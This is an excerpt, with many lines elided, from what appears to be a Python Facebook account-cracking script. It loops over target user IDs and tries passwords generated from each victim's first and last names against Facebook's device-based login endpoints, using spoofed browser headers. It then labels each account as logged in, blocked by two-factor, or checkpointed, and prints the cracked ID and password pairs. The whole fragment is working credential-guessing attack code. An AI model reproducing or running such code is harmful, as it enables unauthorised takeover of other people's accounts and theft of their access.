...
def method3(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = f'https://h.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
            ...
            'cache-control': 'max-age=0',
            'referer': f'https://h.facebook.com/login/device-based/password/?uid='+ids+'&errorcode=1348092&next=https%3A%2F%2Fmbasic.facebook.com%3Flogin%3Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',
            ...
            'referer': f'https://x.facebook.com/login/device-based/password/?uid='+ids+'&errorcode=1348092&next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
...
#https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=payload,headers=header).text
            ...
            if 'c_user' in cookies:
                    print('\033[1;32m[COX-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                ...
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        print('\033[1;35m[COX-2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
                        ...
                        if cid in cp:
                            ...
                            print('\033[1;31m[COX-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
